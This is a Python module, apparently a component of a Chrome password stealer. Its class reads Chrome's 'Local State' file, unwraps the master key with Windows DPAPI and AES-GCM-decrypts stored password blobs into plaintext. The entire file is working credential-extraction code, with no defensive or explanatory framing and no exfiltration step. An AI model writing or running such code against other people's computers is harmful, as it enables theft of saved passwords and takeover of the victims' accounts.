import os
import json
import base64
import platform
from Cryptodome.Cipher import AES
try:
    import win32crypt
except ImportError as ex:
    print(ex)


class Cipher:
    """ class Cipher to create the ciphers and decrypt the payloads

        Usage:
            cipher = Cipher()

    """
    def __init__(self):

        if platform.system() == 'Windows':
            self.local_state_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'

        elif platform.system() == 'Linux':
            pass

    def get_master_key(self):
        """ get the master key from the Local State file

        :return: master_key
        """

        with open(self.local_state_path, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

    def decrypt_payload(self, cipher, payload):
        """ decrypts the given payload

        :param cipher: cipher
        :param payload: payload

        :return: decrypted payload
        """
        return cipher.decrypt(payload)

    def generate_cipher(self, aes_key, iv):
        """ generates the AES cipher in GCM Mode

        :param aes_key: aes key
        :param iv: iv

        :return: AES cipher
        """
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self, buff, master_key):
        """ decrypts the password

        :param buff: buffer
        :param master_key: master key

        :return: decrypted password
        """

        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
            return decrypted_pass
        except Exception as ex:
            print(ex)

    def crypt_unprotected_data(self, encrypted_password):
        """ crypt unprotected data with the win32crypt module

        :return: decrypted password
        """
        return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
